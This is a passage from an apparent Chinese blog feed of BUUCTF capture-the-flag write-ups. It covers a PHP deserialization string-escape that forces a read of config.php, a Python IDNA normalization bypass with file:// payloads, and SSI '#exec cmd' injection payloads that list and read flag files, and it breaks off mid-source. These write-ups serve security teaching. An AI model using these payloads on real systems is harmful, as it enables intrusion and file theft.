</span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO $table ($key) VALUES ($value)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> update($table, $key, $value, $where) &#123;</span><br><span class="line">$sql = <span class="string">&quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> filter($<span class="keyword">string</span>) &#123;     //父类filer</span><br><span class="line">$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;</span><br><span class="line">$<span class="keyword">string</span> = preg_replace($escape, &#x27;_&#x27;, $<span class="keyword">string</span>);  //一顿操作下来就是一个正则</span><br><span class="line"></span><br><span class="line">$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, &#x27;hacker&#x27;, $<span class="keyword">string</span>);</span><br><span class="line">&#125;</span><br><span class="line">public <span class="keyword">function</span> __tostring() &#123;</span><br><span class="line"><span class="keyword">return</span> __class__;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = new user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure><p>直接定位到update_profile函数</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> update_profile($username, $new_profile) &#123;</span><br><span class="line">$username = parent::filter($username);</span><br><span class="line">$new_profile = parent::filter($new_profile);</span><br></pre></td></tr></table></figure><p>这里通过继承类，调用父类的filter函数</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> filter($<span class="keyword">string</span>) &#123;     //父类filer</span><br><span class="line">$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;</span><br><span class="line">$<span class="keyword">string</span> = preg_replace($escape, &#x27;_&#x27;, $<span class="keyword">string</span>);  //一顿操作下来就是一个正则</span><br><span class="line"></span><br><span class="line">$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, &#x27;hacker&#x27;, $<span class="keyword">string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里相当于一个过滤器</p><p>重点看第二个正则 如果我们传入的字符串有<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>则会被替换为<code>hacker</code>  至此暂时结束</p><p>当我们上传完update.php需要的信息之后会跳入profile.php</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//profile.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#x27;class.php&#x27;);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">die(&#x27;Login First&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == null) &#123;</span><br><span class="line">header(&#x27;Location: update.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">$email = $profile[&#x27;email&#x27;];</span><br><span class="line">$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里终于看到了我们常见的漏洞点file_get_contents()函数</p><p>先经过反序列化<code>$profile</code>数组</p><p>然后base64编码读出<code>$profile[&#39;photo&#39;]</code></p><p>之前看到config.php中含有flag 那么我们可以让<code>$profile[&#39;photo&#39;]=config.php</code>不就可以拿到flag了</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>但是photo部分是文件上传部分，并不能直接让他等于config.php去拿到flag</p><p>这里就要用到反序列化字符串逃逸了</p><p>在整个过程中存在序列化与反序列化，我们可以在nickname部分构造出符合反序列化的字符串，在nickname存在config.php让其反序列化到后边的photo部分，相当于提前结束反序列化，让原本photo部分的反序列化部分丢失，从而达到使得<code>$profile[&#39;photo&#39;]=config.php</code></p><p>那么我们需要在nickname序列化后的部分塞入<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>共33个字符</p><p>这里构造合法反序列化部分很巧妙</p><p>之前看代码它存在一个过滤器</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, &#x27;hacker&#x27;, $<span class="keyword">string</span>);</span><br></pre></td></tr></table></figure><p>如果我们只是单纯把<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这一部分塞入nickname那么它经过序列化后，再经过反序列化全部部分还是属于nickname部分，我们就需要在他序列化后构造让他字符串溢出，然后溢出部分就会到photo部分</p><p>我们可以让<code>nickname=where</code>然后序列化后经过过滤器where会被替换为hacker,where为5个字符，而hacker为6个字符，多出一个字符，就这样使得它在反序列时还是按照原本5个字符去反序列化，还有一个字符就溢出逃逸了。</p><p>可以简单借助下面的脚本理解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;     <span class="comment">//父类filer</span></span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);  <span class="comment">//一顿操作下来就是一个正则</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">array</span>(<span class="string">&quot;phone&quot;</span>=&gt;<span class="string">&quot;12345678912&quot;</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="string">&quot;123@qq.com&quot;</span>,<span class="string">&quot;nickname&quot;</span>=&gt;<span class="string">&quot;where&quot;</span>,<span class="string">&quot;photo&quot;</span>=&gt;<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：这里第二行hacker明明是6个字符但是在序列化字符串中还是显示5，那么多余出来的一个字符将会在反序列化过程中逃逸。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292442387-dfaaedff-1c6d-4dbc-a7bf-f889153b5ded.png" alt="img"></p><p>那么我们塞入字符串<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>是33个字符，则需要33个where</p><p>但是之前看到nickname部分不能超过10个字符</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292530703-ad1938a2-50bb-44cb-b17f-326547c2d3b9.png" alt="img"></p><p>这里可以通过数组方式绕开正则匹配即<code>nickename[]</code></p><p>这里<code>$profile</code>已经是一个数组了，如果数组里面再包含一个数组，那么序列化后的字符串稍有不同。</p><p>通过一个脚本来帮助理解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&quot;age&quot;</span>=&gt;<span class="keyword">array</span>(<span class="number">17</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292655293-2cc8bf95-340a-4112-8ae9-dfd90f65fb8c.png" alt="img"></p><p>会有花括号去包裹数组中的数组部分，那么我们在闭合nickname这部分时也需要特意构造一个右花括号去闭合，使其成为合法反序列化部分。</p><p>即<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>我们需要塞入34个字符</p><p>那么nickname就需要有34个where</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>其他部分任意</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292841846-e07c45fe-820f-4146-9ee8-3ffd7c96068d.png" alt="img"></p><p>进入profile.php去解码这段base64</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292879095-67419a27-16e3-4ec0-857c-ebabf61f6e6f.png" alt="img"></p><p>就可以拿到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292910852-9d761113-d1cd-4816-921d-e3b225f34f46.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 反序列化字符串逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-63-[SUCTF 2019]Pythonginx</title>
      <link href="/post/487317b8.html"/>
      <url>/post/487317b8.html</url>
      
        <content type="html"><![CDATA[<p>[SUCTF 2019]Pythonginx</p><span id="more"></span><p>一道关于python解析idna编码与utf-8解码后的字符串的漏洞题目</p><p>CVE-2019-9636：urlsplit 不处理 NFKC 标准化</p><p>CVE-2019-10160：urlsplit NFKD 标准化漏洞</p><p>源码：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&#x27;.&#x27;):</span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-<span class="number">8</span>&#x27;))</span><br><span class="line">    parts[<span class="number">1</span>] = &#x27;.&#x27;.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go <span class="keyword">on</span>! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>完整分析过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">url =<span class="string">&quot;http://www.baidu.com/index.php&quot;</span></span><br><span class="line">host = parse.urlparse(url).hostname <span class="comment">#第一次host</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次host:&quot;</span>,host)</span><br><span class="line">parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;parts:&quot;</span>,parts)</span><br><span class="line">host = parts[<span class="number">1</span>]  <span class="comment">#第二次host</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第二次host:&quot;</span>,host)</span><br><span class="line">newhost = []</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;以点分割：&quot;</span>,host.split(<span class="string">&#x27;.&#x27;</span>)) <span class="comment">#以.为分隔符返回一个列表</span></span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">    newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#漏洞产生点</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;经过idna编码与utf-8解码后newhost:&quot;</span>,newhost)</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line"><span class="comment">#去掉 url 中的空格</span></span><br><span class="line">finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">host = parse.urlparse(finalUrl).hostname  <span class="comment">#第三次host</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第三次host:&quot;</span>,host)</span><br></pre></td></tr></table></figure><p>这里说说host与hostname吧</p><p> <code>host=hostname+&#39;:&#39;+port(not 80)</code>  </p><p> 如果http使用默认的80端口，host可以省略掉冒号+端口，看上去和hostname一样 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host = parse.urlparse(url).hostname</span><br></pre></td></tr></table></figure><p>这一行获取我们的hostname 并且需要有协议才行 比如https:&#x2F;&#x2F;,http:&#x2F;&#x2F;,或者file:&#x2F;&#x2F;，这样才能获取到我们的hostname，也就是payload形式，必须也是这样包含协议的形式</p><p>具体分割部分，可以去看官方手册<a href="https://docs.python.org/zh-cn/3/library/urllib.parse.html?highlight=urlsplit">https://docs.python.org/zh-cn/3/library/urllib.parse.html?highlight=urlsplit</a></p><p>输出：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210222158-baba3125-052f-4eae-b0eb-681f23c4953a.png" alt="img"></p><p>目标绕开第一第二个if，那么操作点就在这里</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for h in host.split(&#x27;.&#x27;):</span><br><span class="line">    newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-<span class="number">8</span>&#x27;))</span><br></pre></td></tr></table></figure><p>比如<code>℆</code> 这个字符经过以上操作之后就变为了c&#x2F;u</p><p>那么我们就可以让题目需要的<code>suctf.cc</code>改为<code>suctf.c ℆ </code>然后经过idna编码utf-8解码后，变为我们需要的suctf.cc&#x2F;u</p><p>还需要了解一些关于nginx的重要文件位置：</p><ul><li>配置文件存放目录：&#x2F;etc&#x2F;nginx</li><li>主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</li><li>管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</li><li>模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</li><li>应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</li><li>程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</li><li>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</li><li>配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</li></ul><p>先来找flag文件的位置，看了wp</p><p>payload:<code>?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210794235-67212c4a-f398-4e90-9615-d84f0c656810.png" alt="img"></p><p>读就行了<code>?url=file://suctf.c℆sr/fffffflag</code></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-62-[BJDCTF2020]EasySearch</title>
      <link href="/post/9c6e15d.html"/>
      <url>/post/9c6e15d.html</url>
      
        <content type="html"><![CDATA[<p>[BJDCTF2020]EasySearch</p><span id="more"></span><p>扫网站后台，buu常常扫不出来算了，直接从网上扒一个</p><p>发现有&#x2F;index.php.swp</p><p>源码如下：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">function</span> get_hash()&#123;</span><br><span class="line">$chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@<span class="comment">#$%^&amp;*()+-&#x27;;</span></span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];//Random <span class="number">5</span> times</span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(isset($_POST[&#x27;username&#x27;]) <span class="keyword">and</span> $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;<span class="number">6</span>d0bc1&#x27;;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[&#x27;password&#x27;]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            $file_shtml = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> die(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>需要密码前六位md5值等于<code>6d0bc1</code></p><p>借助脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>随便选一个 2020666</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037918710-62fadfa4-b94f-45b9-bf41-9ecf8f5ebd72.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/6a55805e27f57db992ebd9b47735c84cb7ec8e91.shtml</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037955243-8985022f-0080-4da4-86cd-967c1e4c6651.png" alt="img"></p><p>看到这里大概率是ssti 但是抓包看既不是python也不是php 所以不会了</p><p>看了wp 才发现是没见过的shtml</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038075990-bfd32873-f395-4af3-8019-feae3efe14ab.png" alt="img"></p><p>其实在源码中也有稍微提示</p><p> 第17行<code>$shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</code></p><p>直接用payload</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038127194-eea19322-3722-45f8-8191-7dcc3e994406.png" alt="img"></p><p>payload：</p><p>flag在上层目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683039208613-241c74dc-ae63-426a-b76c-fceeb8e41dba.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> shtml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-55-[CISCN 2019 初赛]Love Math</title>
      <link href="/post/102492d1.html"/>
      <url>/post/102492d1.html</url>
      
        <content type="html"><![CDATA[<p>[CISCN 2019 初赛]Love Math</p><span id="more"></span><p>这道题就是bypass 利用进制转换函数构造rce 挺不错的</p><p>源码如下:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line"><span 